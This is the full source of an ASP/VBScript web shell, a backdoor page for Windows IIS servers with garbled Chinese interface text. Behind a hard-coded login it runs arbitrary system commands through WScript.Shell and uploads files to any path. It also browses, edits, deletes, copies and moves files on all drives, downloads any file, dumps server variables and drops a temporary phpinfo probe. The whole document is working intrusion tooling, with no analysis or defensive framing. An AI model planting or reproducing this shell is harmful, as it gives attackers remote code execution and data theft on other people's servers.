<%@ LANGUAGE = VBScript codepage=936%><%Response.Expires=0
Co=Request.ServerVariables("URL")
zc="<b>����֮��&copy2004"
zz="<FONT style='FONT-SIZE:48pt;FONT-FAMILY:Webdings'>&ucirc;</FONT>"%><style>body{font-size:9pt;color:blue}table{font-family:����;font-size:9pt}a{font-family:����;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:����;color:red}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial FONT-COLOR:blue;FONT-SIZE:9pt;}</style><%if session("lZ")="lk"then
Session.TimeOut=50
Session(Co)=0
if request("p")=8 then%><SCRIPT RUNAT=SERVER LANGUAGE=VBScript>ScriptTimeOut=3000
dim zh
CLASS ZB
dim isForm,isFile
Public function Form(sg)
Form=isForm(lcase(sg))
if not isForm.exists(sg)then Form=""
end function
Public function File(sj)
File=isFile(lcase(sj))
if not isFile.exists(sj)then File=new ZI
end function
Private Sub CLASS_Initialize
dim Rq,sSt,vbCrlf,sx,oE,tZ,itt,FE,sFV,sFe,fj,iFE,iFS,iFd,sFN
set isForm=CreateObject("Scripting.Dictionary")
set isFile=CreateObject("Scripting.Dictionary")
set tZ=CreateObject("adodb.stream")
set zh=CreateObject("adodb.stream")
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
Rq=zh.Read
iFS=1
iFd=LenB(Rq)
vbCrlf=chrB(13)&chrB(10)
sSt=MidB(Rq,1,InStrB(iFS,Rq,vbCrlf)-1)
itt=LenB(sSt)
iFS=iFS+itt+1
while (iFS+10)<iFd
oE=InStrB(iFS,Rq,vbCrlf&vbCrlf)+3
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=iFS
zh.CopyTo tZ,oE-iFS
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sx=tZ.ReadText
tZ.Close
iFS=InStrB(oE,Rq,sSt)
fj=InStr(22,sx,"name=""",1)+6
iFE=InStr(fj,sx,"""",1)
sFN=lcase(Mid(sx,fj,iFE-fj))
if InStr(45,sx,"filename=""",1)>0 then
set FE=new ZI
fj=InStr(iFE,sx,"filename=""",1)+10
iFE=InStr(fj,sx,"""",1)
sFe=Mid(sx,fj,iFE-fj)
FE.filename=GA(sFe)
FE.fh=GP(sFe)
fj=InStr(iFE,sx,"Content-Type:",1)+14
iFE=InStr(fj,sx,vbCr)
FE.Fz=Mid(sx,fj,iFE-fj)
FE.FSt=oE
FE.fy=iFS-oE-3
FE.fme=sFN
if not isFile.Exists(sFN)then isFile.add sFN,FE
else
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=oE
zh.CopyTo tZ,iFS-oE-3
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sFV=tZ.ReadText
tZ.Close
if not isForm.Exists(sFN)then isForm.Add sFN,sFV
end if
iFS=iFS+itt+1
wend
Rq=""
set tZ=nothing
End Sub
Private function GP(Ph)
GP=left(Ph,InStrRev(Ph,"\"))
End function
Private function GA(Ph)
GA=mid(Ph,InStrRev(Ph,"\")+1)
End function End CLASS
CLASS ZI
dim FSt,fy,filename,fh,Fz,fme,dr
Public function SD(Ph)
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FSt
zh.copyto dr,fy
dr.SaveToFile Ph,2
dr.Close
set dr=nothing
end function End CLASS</SCRIPT><%set ud=new ZB
fP=ud.isform("fh")
if right(fP,1)<>"\"then fP=fP&"\"
for each fme in ud.isFile
set file=ud.isFile(fme)
if file.filename=""or file.fy<0 then
Response.Write"<a href=# onclick=history.go(-1)>�ļ�?</a>"
response.end
end if
file.SD fP&file.filename
Response.write"�ϴ��� "&fP&file.filename&"</br>"
set file=nothing
next
set ud=nothing
response.write"<a href=# onclick=history.back()>[����]</a>"
response.end
else
on error resume next
set fB=Server.CreateObject("Scripting.FileSystemObject")
Set tN=Server.CreateObject("WSCRIPT.NETWORK")
dN="\\"&tN.ComputerName&"\"&tN.UserName
If -2147221005=Err then
call MN()
else
Rx=Request("pw")
Rp=""&Co&"?pw="&Server.URlEncode(Request("jl"))&"&ib="&Request("ib")
select case request("id")
case"edit"call edit()
case"dir"call dir()
case"dc"call ZD()
case"pan"call pan()
case"FS"call MN()
case"out"call out()
case else call mz()
end select
end if
sub MN()
set sa=server.createobject("shell.application")%><p align=center><table border=1 width=580 cellspacing=0 cellpadding=0 bgcolor=#dddddd><tr><td>��������</td><td width=338><a href=http://<%=Request.ServerVariables("SERVER_NAME")%> target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td></tr><tr><td>IP:�˿�  ʱ��</td><td><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%>��<%=now%></td></tr><tr><td>CPU���� OS</td><td><%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> �� {<%=Request.ServerVariables("OS")%>}</td></tr><tr><td>������ַ:</td><td><%=dN%></td></tr><tr><%t1=timer
for i=1 to 500000
ys=1+1
next
t2=timer
T3=cstr(int(((t2-t1)*10000)+0.5)/10)%><td>�����ٶ�</td><td><%=T3%> ����(256M 2.4GΪ156.3����)</td></tr><tr><td><font color=red>�ͻ���IP���˿� [�޴���]</td><td><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>��<%=Request.ServerVariables("REMOTE_PORT")%>
[<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr><tr><td>���ļ�</td><td><%=server.mappath(Co)%></td></tr><TR><TD colspan=2><form method=post name=fm action="<%=Co%>?p=8" enctype="multipart/form-data"> ����·��:<input type=text name=fh value="<%=Server.MapPath(".")%>"size=84><BR></TD></tr><tr><td id=uz width=242>�ļ�1<input type=file name=file></td><td valign=top><SCRIPT language=javascript>function sm(){fl=document.fm;str='';if(!fl.ut.value)fl.ut.value=1;for(i=1;i<=fl.ut.value;i++)str+='�ļ�'+i+'<input type=file name=file'+i+'><br>';window.uz.innerHTML=str+'';}</SCRIPT><INPUT type=button onclick=sm() value=�趨> �ϴ� <INPUT value=1 name=ut size=2 maxlength=2> �ļ� <input type=submit value=�ϴ�> <INPUT type=reset value=����></td></TR></form></table><form method=post><input type=submit value=ִ��> <input type=submit name=ZG value=����������> <input type=submit name=ih value=�˳�> <INPUT type=reset value=����> <%=timer%>
<a href=<%=Co%>><%=zc%></a><BR>����:<input type=text name=zk> Ŀ��·��:<input type=text name=zl><br>�ƶ�:<input type=text name=zm> Ŀ��·��:<input type=text name=zn><br>����:<input type=text name=zo> ��Ӳ���:<input type=text name=zq><br>���:<input type=text name=ZJ> DOS ����:<input type=text name=ok value="%COMSPEC% /c "><br>����:<input type=text name=pw> 
ȥӣ�������վ <input type=submit name=bz value="����֮��"></form><hr><%if Request("ih")<>""then call out()
if Request("pw")<>""then call ZD()
if Request("bz")<>""then response.redirect""
if Request("ZG")<>""then
response.write"���������б���</p>"
for each Y in request.servervariables
response.write""&Y&"<br>"&request.servervariables(Y)&"<HR>"
next
end if
hz=Request("ok")
if hz<>""and hz<>"%COMSPEC% /c "then
server.CreateObject("WScript.Shell").run ""&hz&"",1,True
response.write"ִ����"&hz&""
end if
sz=Request("ZJ")
if sz<>""then
if right(sz,1)<>"\"then sz=sz&"\"
for each Z in sa.namespace(sz).items
response.write""&Z.path&"  --"&Z.size&"<br>"
next
end if
z1=Request("zk")
z2=Request("zl")
if z1<>""and z2<>""then
if right(z2,1)<>"\"then z2=z2&"\"
for i=len(z1) to 1 step -1
if mid(z1,i,1)="\"then
pw=left(z1,i-1)
exit for
end if
next
pz=right(z1,len(z1)-i)
sa.namespace(z2).copyhere sa.namespace(pw).parsename(pz)
response.write"ok!"
end if
z3=Request("zm")
z4=Request("zn")
if z3<>""and z4<>""then
if right(z4,1)<>"\"then z4=z4&"\"
for i=len(z3) to 1 step -1
if mid(z3,i,1)="\"then
pw=left(z3,i-1)
exit for
end if
next
pv=right(z3,len(z3)-i)
sa.namespace(z4).movehere sa.namespace(pw).parsename(pv)
response.write"ok!"
end if
z5=Request("zo")
z6=Request("zq")
if z5<>""and z6<>""then
if right(z5,1)<>"\"then z5=z5&"\"
sa.namespace(z5).items.item(z6).invokeverb
response.write"ok!"
end if
end sub
sub mz()
zw=Rx
if right(zw,1)<>"/" then zw=Rx&"/"
if Request("ib")="true"then
zv=zw
ib="true"
else
zv=Server.MapPath(zw)
ib=""
end if%><script language=JavaScript>function crfile(ls){if(ls==""){alert("�ļ���?");}else{window.open("<%=Co%>?id=edit&ib=<%=request("ib")%>&cy=Y&pw=<%=Server.URlEncode(zw)%>"+ls)}}function crdir(ls){if (ls==""){alert("Ŀ¼��?");}else{window.open("<%=Co%>?id=dir&ib=<%=request("ib")%>&op=cz&pw=<%=Server.URlEncode(zw)%>"+ls)}}</script><script LANGUAGE=VBSCRIPT>ib="<%=request("ib")%>"
sub copyfile(zu)
dz=trim(InputBox(""&Chr(13)&Chr(10)&"Դ�ļ���"&zu&Chr(13)&Chr(10)&"Ŀ���ļ�:"&Chr(13)&Chr(10)&"���·�� ��c:/��c:\����"))
if dz=""then
alert"�ļ���?"
else
window.open"<%=Co%>?id=edit&pw="+zu+"&op=copy&ib=true&dpath="+dz
end If end sub</script><center><TABLE border=1 cellSpacing=1 cellPadding=3 width=768 bgColor=#dddddd><tr><td colspan=4><a href=?id=out title=�˳�>���ļ�: <%=server.mappath(Co)%></a></td></tr><TD colspan=4 bgcolor=white>�л��̷���<%For Each thing in fB.Drives
Response.write"<a href=?pw="&thing.DriveLetter&":&ib=true>"&thing.DriveLetter&"��:</a> "
NEXT%>������ַ��<%=dN%></TD><tr><TD colspan=4><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>:<%=Request.ServerVariables("REMOTE_PORT")%> [<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font><a href=?id=pan> ������Ϣ </a><%=now%><a href=?id=FS> <%=zc%> </a>&nbsp;<%if Request("ib")=""then%><a href=<%=Co%>?path=<%=zw%>&php=7> PHP ̽�� </a><%end if%></TD></tr><TD colspan=4 bgcolor=white><a href=<%=Co%><%if Request("ib")="true" then%> title=�������·��<%else%>?ib=true&pw=<%=zv%> title=��������·��<%end if%>><%if Request("ib")="true" then%>��<%else%>��<%end if%>��·�� <%=zv%></a> ��ǰĿ¼:<%=zw%></TD><TR><TD colspan=4><form>
���Ŀ¼: <input type=text name=pw size=90 value=c:><input type=hidden name=ib value=true> <input type=submit value=���></TD></form></TR><TR bgColor=white><form><TD colspan=4>���������Ŀ¼���ļ� #��%23 %��%25 &��%26 +��%2B '��%27 <input type=text name=fn size=44> <input type=button onclick=crfile(fn.value) value=���ļ�> <input type=button value=��Ŀ¼ onclick=crdir(fn.value)></TD></form></TR><TR><TD width=210 valign=top rowspan=2><%if fB.FolderExists(zv)then
Set Fc=fB.GetFolder(zv)
Set fg=Fc.SubFolders
fk=left(zw,Abs(len(zw)-(len(Fc.name)+1)))
Response.write"<a href="&Co&"?pw="&Server.URlEncode(fk)&"&ib="&ib&"><b>�����ϼ�Ŀ¼</b></a><br>"
For Each x In fg
Response.write"<a href="&Co&"?pw="&Server.URlEncode(zw&x.Name)&"&ib="&ib&">���� "&x.Name&"</a> <a href="&Co&"?id=dir&pw="&Server.URlEncode(zw&x.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick="&chr(34)&"return confirm('ɾ��"&Server.URlEncode(x.Name)&"?')"&chr(34)&">��ɾ��</a><br>"
Next%></TD><TD width=232>&nbsp;�ļ�</TD><TD align=right width=108>���� ��С���ֽڣ�</TD><TD align=center width=94>����</TD></TR><TR><TD colspan=3 valign=top bgColor=WHITE><table width=528 cellspacing=0 cellpadding=2><%Set FEs=Fc.Files
For Each x In FEs
if Request("ib")="true" then
showstring="<a href="&Co&"?id=dc&pw="&Server.URlEncode(zw&x.Name)&" title='"&"����"&x.type&chr(10)&"ʱ�䣺"&x.DateLastModified&"'target=_blank><b>"&x.Name&"</b></a>"
else
showstring="<a href="&zw&x.Name&" title='"&"����"&x.type&chr(10)&"ʱ�䣺"&x.DateLastModified&"'target=_blank><b>"&x.Name&"</b></a>"
end if
Response.write"<tr><td width=356 style='border-bottom:1 solid blue'>"&showstring&"</td><td width=80 style='border-bottom:1 solid blue'>"&x.Attributes&" "&x.size&"</a></td><td width=92 style='border-bottom:1 solid blue'><a href="&Co&"?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&ib="&ib&" target=_blank>�༭ </a><a href="&Co&"?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick="&chr(34)&"return confirm('ɾ��"&Server.URlEncode(x.Name)&"?')"&chr(34)&">ɾ��</a>"
if Request("ib")="true"then Response.write"<a href=# onclick=copyfile('"&Server.URlEncode(zw&x.Name)&"')> ����</a>"
Response.write"</td></tr>"
Next
end if%></table></TD></TR></TABLE><%end sub
sub pan()
For Each pa in fB.Drives
On Error Resume Next
pa1=pa.AvailableSpace
if pa1/1024/1024<1024 then
pa1=round(pa1/1024/1024*100)/100&" MB"
else
pa1=round(pa1/1024/1024/1024*100)/100&" GB"
end if
pa2=round(pa.TotalSize/1024/1024/1024*100)/100
pa3=pa.DriveType
select case pa3
case 0 pa3="δ֪"
case 1 pa3="����"
case 2 pa3="Ӳ��"
case 3 pa3="����"
case 4 pa3="����"
case 5 pa3="RAM��"
end select
Response.write"<a href="&Co&"?pw="&pa.DriveLetter&":&ib=true>"&pa3&" "&pa.DriveLetter&" &nbsp�ļ�ϵͳ:"&pa.FileSystem&" &nbsp&nbsp����&nbsp "&pa2&" GB &nbsp&nbsp���ÿռ�&nbsp"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>"
next
end sub
sub edit()
pF=Rx
if Request("ib")<>"true"then pF=server.mappath(pF)
if request("op")="del"then
if fB.GetFile(pF)<>fB.GetFile(server.mappath(Co)) then
fB.GetFile(pF).Delete True
end if
Response.redirect Rp
end if
if request("op")="copy"then
dx=Request("dpath")
fB.GetFile(pF).copy dx
Response.write"<SCRIPT>alert('����"+pF+" ��"+REPLACE(dx,"\","/")+"');window.close()</SCRIPT>"
end if
if request("zt")=""then
if Request("cy")<>"Y"then
Set ZF=fB.OpenTextFile(pF,1,False)
Za=Server.HTMLEncode(ZF.readall)
ZF.Close
end if%><SCRIPT language=JavaScript>var i=0;var ie=(document.all)?1:0;var ns=(document.layers)?1:0;function selectCode(){if(document.pad.zt.value.length>0){document.pad.zt.focus();document.pad.zt.select();}else alert('����?')}function preview(){if(document.pad.zt.value.length>0){pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");pr.document.write(document.pad.zt.value);}else alert('Ԥ������?')}function uncompile(){if (document.pad.zt.value.length>0){source=unescape(document.pad.zt.value);document.pad.zt.value=""+source+"";i++;alert("����"+i+"��!");}else alert('����?')}</SCRIPT><form method=post name=pad action="<%=Co%>?id=edit"><input type=hidden name=ib value="<%=Request("ib")%>"><CENTER><TD>�༭�ļ�����<input type=text name=pw value="<%=Rx%>"></TD><BR><TD><textarea rows=30 cols=100% name=zt><%=Za%></textarea></TD><BR><TD><input type=submit value=�ύ> <INPUT onclick=selectCode() type=button value=ȫѡ>
<INPUT onclick=preview() type=button value=Ԥ��> <INPUT onclick=uncompile() type=button value=JAVA����> <INPUT type=reset value=����></TD></form><%else
fB.CreateTextFile(pF).Write Request("zt")
Response.write"<SCRIPT>alert('��ɣ�"+Rx+"');window.close()</SCRIPT>"
end if end sub
end if
sub dir()
zp=Rx
if Request("ib")<>"true"then zp=server.mappath(zp)
if request("op")="del"then
fB.DeleteFolder zp,True
Response.redirect Rp
end if
if request("op")="cz"then
fB.CreateFolder zp
Response.write"<SCRIPT>alert('��Ŀ¼:"&REPLACE(zp,"\","/")&"');window.close()</SCRIPT>"
end if end sub
function ZD()
zr=REPLACE(Trim(Request("pw")),"/","\")
Set s=Server.CreateObject("ADODB.Stream")
s.Open
s.Type=1
s.LoadFromFile(zr)
for i=len(zr) to 1 step -1
if mid(zr,i,1)="\"then exit for
next
ny=right(zr,len(zr)-i)
Response.Clear
Response.AddHeader"Content-Disposition","attachment;filename="&ny
Response.CharSet="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite s.Read
s.Close
Set s=nothing
End Function
function out()
Session.Abandon
response.redirect Co
End Function
if request("php")=7 then
Response.Expires=1
fB.CreateTextFile(server.mappath("lp.php")).Write"<center>PHP̽��<input type=button value=�ر�(ALT+X) onClick='JavaScript:self.close()' accesskey='X'><br><? phpinfo(); //�ź�:�˷�������֧��PHP ?>"
Response.write"<script>window.open('lp.php')</script>"
Response.Flush
for i=1 to 3800000
ys=9+9
next
fB.GetFile(server.mappath("lp.php")).Delete True
end if 
else
randomize timer
rj=int(rnd*8998)+1000%><center><%=zc%><script language=javascript>function check(){var mj=document.adm;if(mj.az.value.length<=0){alert("������");mj.az.focus();return false;}if(mj.aw.value.length<=0){alert("���룿");mj.aw.focus();return false;}if(mj.rz.value.length<=0){alert("�����룿");mj.rz.focus();return false;}var n2=mj.rz1.value;if(mj.rz.value!=n2){window.alert('������: '+n2+'');mj.rz.focus();return false;}}</script><%if request("az")<>""and request("az")<>"cnhongker"then response.write"����?"
if request("aw")<>""and request("aw")<>"cnhongker"then response.write"����?"
if request("az")="heiker8"and request("aw")="supervisor"then
session("lZ")="lk"
response.redirect Co
else
Session(Co)=Session(Co)+1
if Session(Co)=4 then response.redirect"http://"&Request.ServerVariables("SERVER_NAME")&""
if Session(Co)>4 then response.write"<script>self.window()</script>"%><form name=adm onsubmit="return check()">����: <input type=password name=az><br>����: <input type=password name=aw><input type=hidden name=rz1 value=<%=rj%>><BR>��֤: <input type=password name=rz size=14> <%=rj%><br>�ỰID:<%=Session.SessionID%> <input type=submit value=��¼> <%=Session(Co)%> ��<p>
	http://www.heiker8.tk/</p>
	<p><font color="#FF0000">���棺��ӣ������ ���� ��ɫˮ�� �����˵�����һҳ�����뿪��</font></p>
</form><%=zz%><%end if end if%>